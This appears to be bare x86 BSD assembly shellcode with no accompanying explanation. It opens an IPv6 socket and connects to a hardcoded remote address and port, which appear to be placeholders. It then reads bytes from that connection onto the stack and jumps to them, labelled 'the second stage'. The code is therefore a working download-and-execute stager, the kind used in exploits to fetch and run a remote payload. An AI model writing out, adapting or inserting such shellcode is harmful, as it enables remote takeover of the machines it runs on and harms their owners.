
socket:
	pushl $97
	popl  %eax
	cdq
	pushl %edx
	incl  %edx
	pushl %edx

	pushl $0x1c  #AF_INET6
	xorl %ecx, %ecx
	movb $0x60, %cl
	pushl %ecx # interface id
	
	int  $0x80

connect:
	pushl $0x11111114
	pushl $0x11111113
	pushl $0x11111112
	pushl $0x11111111

	xorl %ecx, %ecx
	pushl %ecx # flowinfo
	
	pushl $0xbfbf1cbc # port number

	movl  %esp, %ecx
	pushl $0x1c # size
	pushl %ecx # sockaddr *data
	pushl %eax # socket
	pushl %ecx 
	
	xchg %ebx, %eax 
	
	pushl $98 
	popl  %eax
	int  $0x80
	
# read (ebx, esi, 32)
read:
	movl %esp, %esi
	sub $0x80, %esp

        xorl %eax, %eax
	movw $0xaaaa, %ax
	push %eax        ## 32 bytes
	push %esi        ## buff
	movl %ebx, %eax  ## read from the file
	push %eax
	push %eax        ## dummy
	movb $3, %al
	int $0x80

# jump to the second stage
	jmp *%esi
	